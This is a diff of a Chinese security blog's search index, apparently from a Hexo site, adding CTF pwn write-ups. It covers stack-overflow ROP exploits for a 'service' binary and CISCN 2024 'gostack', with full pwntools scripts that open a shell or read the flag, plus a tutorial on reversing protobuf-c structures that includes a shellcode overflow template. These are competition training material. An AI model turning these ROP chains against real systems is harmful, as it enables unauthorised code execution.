-<p>然后发现直接崩掉了，因为rax是一个下标，所以推断是rbx被更改了以至于赋值失败，那么rbx是在哪里被赋值的呢。实际前面有一句<code>mov rbx, [rsp+298h+var_20]</code>,也就是这个rbx基址是存在<strong>ret_addr-0x20</strong>处的。那我们不能更改这个位置的值，但我们又无法获知这个位置的值，该怎么办呢？很巧的是，程序刚好碰到+会跳过赋值，所以我们可以用8个+来保存rbx。其实也不必那么麻烦，直接全用+填充，最后再覆盖也行。然后就能成功覆盖返回地址，但这里这个填充字符数有点迷，最后我本地动调后填充了0x229个字节后才覆盖到返回地址。</p>
-<p>之后是正常的ROP，因为有syscall，就先把&#x2F;bin&#x2F;sh读取到一个地方，然后再用execve调用打即可。最后复现时本地能够用execve通，但远程却有问题，只能拿orw打，不知道是为什么。</p>
-<h6 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h6><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 你的 Base64 编码字符串</span></span><br><span class="line">encoded_str = <span class="string">&quot;JLIX8pbSvYZu/WaG&quot;</span></span><br><span class="line"><span class="comment"># 进行 Base64 解码</span></span><br><span class="line">decoded_bytes = base64.b64decode(encoded_str)</span><br><span class="line"><span class="comment"># 打印解码后的字节字符串</span></span><br><span class="line"><span class="built_in">print</span>(decoded_bytes)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./service&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node4.anna.nssctf.cn&quot;,28629)</span></span><br><span class="line">passwd = <span class="string">b&quot;S33UAga1n@#!&quot;</span></span><br><span class="line">payload = <span class="string">b&quot;cert nAcDsMicN &quot;</span> + passwd</span><br><span class="line">p.sendlineafter(<span class="string">&quot;shell$&quot;</span>,payload)</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000444fec</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000041e818</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x000000000049e11d</span></span><br><span class="line">pop_rax_ret = <span class="number">0x000000000040d9e6</span></span><br><span class="line">syscall = <span class="number">0x000000000040328c</span></span><br><span class="line">ret = <span class="number">0x000000000040103d</span></span><br><span class="line">main = <span class="number">0x00000000004C1D60</span></span><br><span class="line">data = <span class="number">0x5A34A0</span></span><br><span class="line">payload = (<span class="string">b&quot;echo &quot;</span>.ljust(<span class="number">0x1f0</span>,<span class="string">b&quot;A&quot;</span>) + <span class="string">b&quot; &quot;</span>).ljust(<span class="number">0x229</span>,<span class="string">b&quot;+&quot;</span>) + p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(<span class="number">0x8</span>) + p64(syscall)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">2</span>) + p64(pop_rdi_ret) + p64(data) + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(syscall) </span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(<span class="number">0x40</span>) + p64(syscall)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">1</span>) + p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(<span class="number">0x40</span>) + p64(syscall)</span><br><span class="line"><span class="comment">#+ p64(pop_rax_ret) + p64(0x3b) + p64(pop_rdi_ret) + p64(data) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(syscall) + p64(main)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;nightingale#&quot;</span>,payload)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">&quot;/flag\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-
-
-<h5 id="CISCN-2024-初赛-gostack"><a href="#CISCN-2024-初赛-gostack" class="headerlink" title="[CISCN 2024 初赛]gostack"></a>[CISCN 2024 初赛]gostack</h5><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202922399.png"
-                      class=""
-                >
-
-<p>先运行一遍找提示字符串，看到调用位置在main_func3，直接gdb打断点进去调试一下。发现输入存在如下位置，但是存在栈上的是指针，没什么用。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202932191.png"
-                      class=""
-                >
-
-<p>之后还会把数据写到栈的另一个地方，这里直接把内容复制到栈上了，并且没有检测加跳转，可能会有溢出。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202943137.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202953894.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922203005886.png"
-                      class=""
-                >
-
-<p>然后我们再看看程序的其他部分，其中有个<strong>main_executeCommand</strong>函数引入注目，其中有如下两个子函数：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">call    os_exec_Command</span><br><span class="line">...</span><br><span class="line">call    os_exec__ptr_Cmd_Run</span><br></pre></td></tr></table></figure></div>
-
-<p>其中前者用于创建一个 <code>Cmd</code> 对象，后者用于执行真正的命令。</p>
-<p>那么我们试试直接填充0x1d0字节，然后把返回地址覆盖为<strong>main_executeCommand</strong>地址。结果会在最后<code>fmt_Fprintf-&gt;fmt__ptr_pp_doPrintf-&gt;fmt__ptr_pp_printArg-&gt;fmt__ptr_pp_fmtString-&gt;fmt__ptr_fmt_fmtS-&gt;fmt__ptr_fmt_padString-&gt;runtime_growslice</code>这个调用链然后gopanic退出，其提示信息为<code>&quot;growslice: cap out of rangeinternal loc&quot;...</code>，也就是说Go 语言在处理切片（slice）扩容时，发生容量超出合理范围时的一个运行时错误。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x449852    mov    rdi, rsi                        RDI =&gt; 0x4141414141414155 (&#x27;UAAAAAAA&#x27;)</span><br><span class="line">......</span><br><span class="line">0x449939    movabs r8, 0x1000000000000         R8 =&gt; 0x1000000000000</span><br><span class="line">0x449943    cmp    rsi, r8                     0x4141414141414155 - 0x1000000000000     EFLAGS =&gt; 0x206 [ cf PF af zf sf IF df of ]</span><br><span class="line">0x449946    seta   r9b</span><br><span class="line">0x44994a    mov    rsi, rcx                    RSI =&gt; 0x14</span><br><span class="line">0x44994d    mov    r10, rdx                    R10 =&gt; 0x4141414141416000</span><br><span class="line">0x449950    jmp    0x449c69                    &lt;0x449c69&gt;</span><br><span class="line">↓</span><br><span class="line">0x449c69    test   r9b, r9b     1 &amp; 1     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ]</span><br><span class="line">0x449c6c  ✔ jne    0x449d4d                    &lt;0x449d4d&gt;</span><br></pre></td></tr></table></figure></div>
-
-<p>我们稍微往前看就可以发现这里rsi和r8的比较实际上应该就是判断切片大小，而存大小的位置被我们覆盖成为了一堆A。也就是说我们破坏了<code>fmt_Fprintf</code>的一些参数。那我们就打断点在这个函数处看看哪些参数被覆盖成了一堆A。rdx很可疑。但前面调用<code>runtime_convTstring</code>后就没有动过rdx了，这个<code>runtime_convTstring</code>函数也比较短，可以跟进去看看。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922203024108.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922203039143.png"
-                      class=""
-                >
-
-<p>其中唯一修改了rdx的是这一句，这个函数的栈帧在一开始 <code>sub rsp, 20h</code> 扩充的空间，这里是把rsp+0x30处的内容复制过来，而rsp+0x30处内容前面有 <code>mov qword ptr [rsp + 0x30], rbx </code> 的修改，而我们进这个函数前rbx就已经是0x4141414141414141了，还要往前追溯。发现前面刚好有个 <code>mov rbx, [rsp+208h+var_C8]</code> ，也就是说我们不能把这个位置的数值覆盖掉。经过进一步用正常数值调试发现，这个位置存的其实就是我们输入的大小。那么我们可以试试先填充0x108个垃圾字符，然后输入大小，之后再正常填充。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922203058314.png"
-                      class=""
-                >
-
-<p>前面的判断绕过了，但在fmt函数中还是崩，但这次是rcx的问题。往前找找，发现是这个<code>runtime_memmove</code>函数的第二个参数源地址被覆盖掉了。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922203113527.png"
-                      class=""
-                >
-
-<p>我们直接把前面要填充的垃圾字符都换成一个可写的地址试试，成功绕过了这个死亡之call，也算是成功地绕过了所有阻碍，终于能劫持控制流返回了（这写了个0x4a0120覆盖返回地址进行测试）。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922203128877.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922203145314.png"
-                      class=""
-                >
-
-<p>后面就可以直接ret2syscall了，这里我本来还想靠<strong>os_exec_Command</strong>玩一下，但还是要先靠read把&#x2F;bin&#x2F;sh读到一个地方，不如直接调用execve。需要注意的是这个syscall会后面带着改栈上的内容，如下图这样rop链就会被打断，需要绕一下。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922203202348.png"
-                      class=""
-                >
-
-<h6 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h6><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./gostack&quot;</span>)</span><br><span class="line">bss_add = <span class="number">0x00000000005633C0</span></span><br><span class="line">syscall = <span class="number">0x0000000000404043</span></span><br><span class="line">pop_rdi_5reg_ret = <span class="number">0x00000000004a18a5</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000042138a</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x00000000004944ec</span></span><br><span class="line">pop_rax_ret = <span class="number">0x000000000040f984</span></span><br><span class="line">rop = p64(pop_rdi_5reg_ret) + p64(<span class="number">0</span>)*<span class="number">6</span> + p64(pop_rsi_ret) + p64(bss_add) + p64(pop_rdx_ret) + p64(<span class="number">0x8</span>) + p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">rop += (p64(pop_rdi_5reg_ret) + p64(bss_add)*<span class="number">6</span>)*<span class="number">3</span> + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(pop_rax_ret) + p64(<span class="number">0x3b</span>) + p64(syscall)</span><br><span class="line"></span><br><span class="line">payload = (p64(bss_add)*<span class="number">33</span> + p64(<span class="number">0x1d8</span>))+(p64(bss_add)*<span class="number">24</span>) + rop</span><br><span class="line">log.success(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input your magic message :&quot;</span>,payload)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
-
-]]></content>
-      <categories>
-        <category>pwn</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>go</tag>
-        <tag>ciscn wp</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>house_of_force</title>
     <url>/blog/2024/10/03/house-of-force/</url>
-    <content><![CDATA[<h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house_of_force"></a>house_of_force</h2><h4 id="适用版本"><a href="#适用版本" class="headerlink" title="适用版本"></a>适用版本</h4><p>glibc2.23 - 2.29</p>
+    <content><![CDATA[<h4 id="适用版本"><a href="#适用版本" class="headerlink" title="适用版本"></a>适用版本</h4><p>glibc2.23 - 2.29</p>
 <h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
 <li>能控制top chunk的size域</li>
 <li>能获取heap_base，进而计算出top_chunk的地址</li>
@@ -935,6 +935,328 @@
         <tag>pwn</tag>
         <tag>heap</tag>
         <tag>house of</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>protobuf初探</title>
+    <url>/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/</url>
+    <content><![CDATA[<h4 id="protobuf简介"><a href="#protobuf简介" class="headerlink" title="protobuf简介"></a>protobuf简介</h4><p>Protocol Buffers（通常简称为protobuf）是由Google开发的一种语言中立、平台中立的序列化结构数据的方法。它用于高效地存储和交换数据，特别适合用于网络通信和数据存储。protobuf的主要特点包括：</p>
+<ol>
+<li><strong>高效性</strong>：protobuf使用紧凑的二进制格式，比其他文本格式（如JSON或XML）更小、更快。</li>
+<li><strong>语言中立</strong>：支持多种编程语言，包括C++、Java、Python、Go等，使得跨平台的数据交换变得简单。</li>
+<li><strong>易于扩展</strong>：可以在不破坏现有数据结构的情况下，轻松地添加新字段。</li>
+<li><strong>定义文件</strong>：使用<code>.proto</code>文件来定义数据结构和服务，可以通过工具自动生成相应的代码。</li>
+</ol>
+<p>通过protobuf，开发者可以定义消息类型，使用这些类型进行数据序列化和反序列化，从而在不同的系统或服务之间传输数据。</p>
+<p><strong>Proto2</strong>: 支持 <code>required</code> 和 <code>optional</code> 修饰符。</p>
+<p><strong>Proto3</strong>: 默认所有字段为 <code>optional</code>，不支持 <code>required</code></p>
+<h4 id="工具集安装"><a href="#工具集安装" class="headerlink" title="工具集安装"></a>工具集安装</h4><ul>
+<li>pbtk:（自动化分析）</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install python3-pip git openjdk-11-jre libqt5x11extras5 python3-pyqt5.qtwebengine python3-pyqt5</span><br><span class="line">sudo pip3 install protobuf pyqt5 pyqtwebengine requests websocket-client</span><br><span class="line">git clone https://github.com/marin-m/pbtk</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>Protobuf 库:（本地搓proto文件并编译成python）</li>
+</ul>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y protobuf-compiler libprotobuf-dev		</span><br><span class="line">sudo apt-get install libprotobuf-c-dev protobuf-c-compiler</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><p>protobuf这类题一般都会将输入转化成特殊的结构体，这就要求我们首先要</p>
+<h4 id="一些结构体定义"><a href="#一些结构体定义" class="headerlink" title="一些结构体定义"></a>一些结构体定义</h4><h6 id="ProtobufCFieldDescriptor"><a href="#ProtobufCFieldDescriptor" class="headerlink" title="ProtobufCFieldDescriptor"></a>ProtobufCFieldDescriptor</h6><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026151257848.png"
+                      class=""
+                >
+
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCFieldDescriptor</span> &#123;</span></span><br><span class="line">    <span class="comment">/** Name of the field as given in the .proto file. */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>      *name;				</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Tag value of the field as given in the .proto file. */</span></span><br><span class="line">    <span class="type">uint32_t</span>        id;					</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */</span></span><br><span class="line">    ProtobufCLabel      label;					</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The type of the field. */</span></span><br><span class="line">    ProtobufCType       type;					</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The offset in bytes of the message&#x27;s C structure&#x27;s quantifier field</span></span><br><span class="line"><span class="comment">     * (the `has_MEMBER` field for optional members or the `n_MEMBER` field</span></span><br><span class="line"><span class="comment">     * for repeated members or the case enum for oneofs).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span>        quantifier_offset;							</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The offset in bytes into the message&#x27;s C structure for the member</span></span><br><span class="line"><span class="comment">     * itself.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span>        offset;					</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A type-specific descriptor.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the</span></span><br><span class="line"><span class="comment">     * corresponding `ProtobufCEnumDescriptor`.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to</span></span><br><span class="line"><span class="comment">     * the corresponding `ProtobufCMessageDescriptor`.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Otherwise this field is NULL.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">void</span>      *descriptor; <span class="comment">/* for MESSAGE and ENUM types */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The default value for this field, if defined. May be NULL. */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">void</span>      *default_value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A flag word. Zero or more of the bits defined in the</span></span><br><span class="line"><span class="comment">     * `ProtobufCFieldFlag` enum may be set.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">uint32_t</span>        flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Reserved for future use. */</span></span><br><span class="line">    <span class="type">unsigned</span>        reserved_flags;</span><br><span class="line">    <span class="comment">/** Reserved for future use. */</span></span><br><span class="line">    <span class="type">void</span>            *reserved2;</span><br><span class="line">    <span class="comment">/** Reserved for future use. */</span></span><br><span class="line">    <span class="type">void</span>            *reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
+
+<h6 id="label和type"><a href="#label和type" class="headerlink" title="label和type"></a>label和type</h6><p>label和type都是枚举类型：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    <span class="comment">/** A well-formed message must have exactly one of this field. */</span></span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A well-formed message can have zero or one of this field (but not</span></span><br><span class="line"><span class="comment">     * more than one).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    PROTOBUF_C_LABEL_OPTIONAL,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * This field can be repeated any number of times (including zero) in a</span></span><br><span class="line"><span class="comment">     * well-formed message. The order of the repeated values will be</span></span><br><span class="line"><span class="comment">     * preserved.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    PROTOBUF_C_LABEL_REPEATED,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * This field has no label. This is valid only in proto3 and is</span></span><br><span class="line"><span class="comment">     * equivalent to OPTIONAL but no &quot;has&quot; quantifier will be consulted.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    PROTOBUF_C_LABEL_NONE,</span><br><span class="line">&#125; ProtobufCLabel;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    PROTOBUF_C_TYPE_INT32,      <span class="comment">/**0&lt; int32 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_SINT32,     <span class="comment">/**1&lt; signed int32 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_SFIXED32,   <span class="comment">/**2&lt; signed int32 (4 bytes) */</span></span><br><span class="line">    PROTOBUF_C_TYPE_INT64,      <span class="comment">/**3&lt; int64 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_SINT64,     <span class="comment">/**4&lt; signed int64 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_SFIXED64,   <span class="comment">/**5&lt; signed int64 (8 bytes) */</span></span><br><span class="line">    PROTOBUF_C_TYPE_UINT32,     <span class="comment">/**6&lt; unsigned int32 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_FIXED32,    <span class="comment">/**7&lt; unsigned int32 (4 bytes) */</span></span><br><span class="line">    PROTOBUF_C_TYPE_UINT64,     <span class="comment">/**8&lt; unsigned int64 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_FIXED64,    <span class="comment">/**9&lt; unsigned int64 (8 bytes) */</span></span><br><span class="line">    PROTOBUF_C_TYPE_FLOAT,      <span class="comment">/**10&lt; float */</span></span><br><span class="line">    PROTOBUF_C_TYPE_DOUBLE,     <span class="comment">/**11&lt; double */</span></span><br><span class="line">    PROTOBUF_C_TYPE_BOOL,       <span class="comment">/**12&lt; boolean */</span></span><br><span class="line">    PROTOBUF_C_TYPE_ENUM,       <span class="comment">/**13&lt; enumerated type */</span></span><br><span class="line">    PROTOBUF_C_TYPE_STRING,     <span class="comment">/**14&lt; UTF-8 or ASCII string */</span></span><br><span class="line">    PROTOBUF_C_TYPE_BYTES,      <span class="comment">/**15&lt; arbitrary byte sequence */</span></span><br><span class="line">    PROTOBUF_C_TYPE_MESSAGE,    <span class="comment">/**16&lt; nested message */</span></span><br><span class="line">&#125; ProtobufCType;</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="定位结构体方式"><a href="#定位结构体方式" class="headerlink" title="定位结构体方式"></a>定位结构体方式</h4><h5 id="1-手动定位"><a href="#1-手动定位" class="headerlink" title="1.手动定位"></a>1.手动定位</h5><p>因为我们输入的内容会通过<code>protobuf_c_message_unpack</code>这个函数进行解析。所以我们可以对比链接库中的函数具体定义以及我们pwn的主程序中调用的传参。然后就能跳转到主程序中的具体descriptor中进行下一步分析。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026144416901.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026144538997.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026144611512.png"
+                      class=""
+                >
+
+<p>首先要在主程序里找一个<code>message_descriptor</code>，一般在.data.rel.ro段，其开头的魔数(magic)是0x28AAEEF9，一般而言下面会直接解析出Protobuf结构体的名字，但也有IDA识别不出来的情况，我们可以手动将db类型转为dq类型，然后就会清晰很多。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026143624589.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026144134084.png"
+                      class=""
+                >
+
+<p>我们的消息结构体名字就为<code>MyMessage</code>。接着我们可以往<code>my_message__field_descriptors</code>里看，里面就是具体的字段，也就是<code>ProtobufCFieldDescriptor</code>这个结构体。但是也都被IDA当作了db解析，我们可以按照下表结构体的字段分布进行修改，手动将其解析一下，主要看name，id，label，type，其他怎么改影响不大。一下子就清晰了不少，然后我们就可以对照着枚举表还原出protobuf了。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026151257848.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026144919768.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026150209780.png"
+                      class=""
+                >
+
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//message.proto</span></span><br><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line">message MyMessage&#123;</span><br><span class="line">    optional <span class="built_in">string</span> name = <span class="number">1</span>;</span><br><span class="line">    required bytes buffer = <span class="number">3</span>;</span><br><span class="line">    required uint32 size = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>然后在命令行将其转化成python文件即可</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">protoc --python_out=. message.proto</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h5 id="2-自动分析"><a href="#2-自动分析" class="headerlink" title="2.自动分析"></a>2.自动分析</h5><p>首先进入之前安装好的pbtk目录，<code>python3 gui.py</code> 就可以启动一个gui窗口，然后选择<code>Extract .proto structures from apps</code>，就可以选择pwn程序自动提取其中的proto文件了。但有时会不灵，还是手动分析有趣。</p>
+<h4 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h4><p>分析完proto的结构，就可以进行exp脚本的编写了，之前我们通过proto生成的python文件名为<code>proto结构体名_pb2</code>，可以先导入exp。</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> message_pb2</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">p = process(<span class="string">&quot;filename&quot;</span>)</span><br><span class="line">......</span><br><span class="line">msg = message_pb2.MyMessage()		<span class="comment">#创建结构体</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#各字段赋值</span></span><br><span class="line">msg.name = <span class="string">&#x27;Admin&#x27;</span></span><br><span class="line">msg.buffer = shellcode.ljust(<span class="number">0x208</span>,<span class="string">b&quot;a&quot;</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(tar)</span><br><span class="line">msg.size = <span class="number">0x220</span></span><br><span class="line"></span><br><span class="line">payload = msg.SerializeToString()		<span class="comment">#转化成proto的序列化字符串</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">......</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="判别proto版本方式"><a href="#判别proto版本方式" class="headerlink" title="判别proto版本方式"></a>判别proto版本方式</h4><p>一般proto分为proto2和proto3两个版本，在写proto文件时要在开头指明<code>syntax=proto2/3</code>。</p>
+<p>在proto3中移除了require这个修饰符，如果有的label位为0（required），就说明用的是proto2语法。</p>
+<p>其实也可以都带进去试试，总共就两个版本，别的地方没分析错的话总有一个会通过的。</p>
+<h4 id="常见问题解决"><a href="#常见问题解决" class="headerlink" title="常见问题解决"></a>常见问题解决</h4><h5 id="1-库找不到"><a href="#1-库找不到" class="headerlink" title="1.库找不到"></a>1.库找不到</h5><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026002833645.png"
+                      class=""
+                >
+
+<p>可以手动在&#x2F;usr&#x2F;lib下添加一个链接</p>
